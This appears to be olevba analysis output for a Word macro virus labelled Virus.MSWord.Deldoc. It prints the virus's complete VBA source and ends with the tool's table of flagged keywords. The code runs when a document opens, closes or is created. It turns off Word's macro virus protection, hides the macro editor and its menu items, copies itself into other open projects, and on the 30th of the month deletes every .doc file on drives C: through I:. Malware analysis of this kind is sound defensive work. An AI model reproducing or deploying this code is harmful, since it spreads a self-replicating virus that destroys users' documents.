olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Deldoc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Deldoc - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Option Explicit
Private Declare Function DeleteFile Lib "kernel32" Alias "DeleteFileA" (ByVal lpFileName As String) As Long
Private Declare Function SetThreadPriority Lib "kernel32" (ByVal hThread As Long, ByVal nPriority As Long) As Long
Private Declare Function GetCurrentThreadId Lib "kernel32" () As Long

Dim bDEBUG As Boolean
Sub test()
    Dim i As Integer
    For i = 1 To Application.Templates.Count
        Debug.Print Application.Templates.Item(i).Name
    Next i
End Sub
Sub TransmitIt()
    On Error Resume Next
    Dim strTP As String
    Dim i, j As Integer
    If Not bDEBUG Then
        If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
            CommandBars("Macro").Controls("Security...").Enabled = False
            System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
        End If

        'È¡Ïûºê²¡¶¾¾¯¸æ£¬×Ô¶¯±£´æNormalÄ£°å
        With Options
            .VirusProtection = False
            .SaveNormalPrompt = False
            .ConfirmConversions = False
            .CreateBackup = False
            .SavePropertiesPrompt = False
            .AllowFastSave = True
            .BackgroundSave = True
        End With
        Application.DisplayAlerts = wdAlertsNone
        WordBasic.DisableAutoMacros 0
        
        '¹Ø±Õ²¢É¾³ýVisual Basic¹¤¾ßÌõ
        CommandBars("Visual Basic").Visible = False
        CommandBars("Visual Basic").Enabled = False
        CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
        CommandBars("Visual Basic").Protection = msoBarNoCustomize
        For i = 1 To Application.Templates.Count
        CommandBars("Tools").Controls("Macro").Delete Application.Templates.Item(i)
        CommandBars("Tools").Controls("Option").Delete Application.Templates.Item(i)
        Next i
        CustomizationContext = NormalTemplate
        
        '½ûÖ¹¿ì½Ý·½Ê½
        FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
        FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
    End If

    '³ÌÊ½µÄ×ÔÎÒ¸´ÖÆ
    j = -1
    
    For i = 1 To Application.VBE.VBProjects.Count
        With Application.VBE.VBProjects(i).VBComponents(1).CodeModule
            If .Find("rrr&ttt", 1, 1, 1000, 1000) Then
                j = i
                strTP = .Lines(1, .CountOfLines)
                Exit For
            End If
        End With
    Next i
    If j < 0 Then Exit Sub
    For i = 1 To Application.VBE.VBProjects.Count
        With Application.VBE.VBProjects(i).VBComponents(1).CodeModule
            If .Find("rrr&ttt", 1, 1, 1000, 1000) Then GoTo RRRNoChange
            If (.CountOfLines > 0) Then .DeleteLines 1, .CountOfLines
            .AddFromString strTP
        End With
        Application.VBE.VBProjects(i).SaveAs FileName:=Application.VBE.VBProjects(i).FileName
        If Not bDEBUG Then Debug.Print Application.VBE.VBProjects(i).FileName
RRRNoChange:
    Next i
End Sub

Sub kill()
    Dim MyApp As New Application
 
    
    Dim fs As FileSearch
    Dim i As Integer
    On Error Resume Next
    Set fs = MyApp.FileSearch
    SetThreadPriority GetCurrentThreadId(), 1
    fs.LookIn = "c:\"
    fs.FileName = "*.doc"
    SetThreadPriority GetCurrentThreadId(), 1
    fs.SearchSubFolders = True
    If fs.Execute() > 0 Then
        For i = 1 To fs.FoundFiles.Count
            If bDEBUG Then Debug.Print fs.FoundFiles(i)
            Selection.TypeParagraph
            Selection.TypeText fs.FoundFiles(i)
            
            DeleteFile fs.FoundFiles(i)
        Next i
    End If
        fs.LookIn = "d:\"
    fs.FileName = "*.doc"
    SetThreadPriority GetCurrentThreadId(), 1
    fs.SearchSubFolders = True
    If fs.Execute() > 0 Then
        For i = 1 To fs.FoundFiles.Count
            If bDEBUG Then Debug.Print fs.FoundFiles(i)
            Selection.TypeParagraph
            Selection.TypeText fs.FoundFiles(i)
            
            DeleteFile fs.FoundFiles(i)
        Next i
    End If
    fs.LookIn = "e:\"
    fs.FileName = "*.doc"
    SetThreadPriority GetCurrentThreadId(), 1
    fs.SearchSubFolders = True
    If fs.Execute() > 0 Then
        For i = 1 To fs.FoundFiles.Count
            If bDEBUG Then Debug.Print fs.FoundFiles(i)
            Selection.TypeParagraph
            Selection.TypeText fs.FoundFiles(i)
            
            DeleteFile fs.FoundFiles(i)
        Next i
    End If
    fs.LookIn = "f:\"
    fs.FileName = "*.doc"
    SetThreadPriority GetCurrentThreadId(), 1
    fs.SearchSubFolders = True
    If fs.Execute() > 0 Then
        For i = 1 To fs.FoundFiles.Count
            If bDEBUG Then Debug.Print fs.FoundFiles(i)
            Selection.TypeParagraph
            Selection.TypeText fs.FoundFiles(i)
            
            DeleteFile fs.FoundFiles(i)
        Next i
    End If
    fs.LookIn = "g:\"
    fs.FileName = "*.doc"
    SetThreadPriority GetCurrentThreadId(), 1
    fs.SearchSubFolders = True
    If fs.Execute() > 0 Then
        For i = 1 To fs.FoundFiles.Count
            If bDEBUG Then Debug.Print fs.FoundFiles(i)
            Selection.TypeParagraph
            Selection.TypeText fs.FoundFiles(i)
            DeleteFile fs.FoundFiles(i)
        Next i
    End If
    fs.LookIn = "h:\"
    fs.FileName = "*.doc"
    SetThreadPriority GetCurrentThreadId(), 1
    fs.SearchSubFolders = True
    If fs.Execute() > 0 Then
        For i = 1 To fs.FoundFiles.Count
            If bDEBUG Then Debug.Print fs.FoundFiles(i)
            Selection.TypeParagraph
            Selection.TypeText fs.FoundFiles(i)
            
            DeleteFile fs.FoundFiles(i)
        Next i
    End If
    fs.LookIn = "i:\"
    fs.FileName = "*.doc"
    SetThreadPriority GetCurrentThreadId(), 1
    fs.SearchSubFolders = True
    If fs.Execute() > 0 Then
        For i = 1 To fs.FoundFiles.Count
            If bDEBUG Then Debug.Print fs.FoundFiles(i)
            Selection.TypeParagraph
            Selection.TypeText fs.FoundFiles(i)
            
            DeleteFile fs.FoundFiles(i)
        Next i
    End If

    MyApp.Quit
End Sub

Sub rrr()
    bDEBUG = False
    TransmitIt
    If ((Not bDEBUG) And (Day(Now) = 30)) Then kill
End Sub

Private Sub Document_Close()
    rrr
End Sub

Private Sub Document_New()
    rrr
End Sub
Private Sub Document_Open()
    rrr
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|kill                |May delete a file                            |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

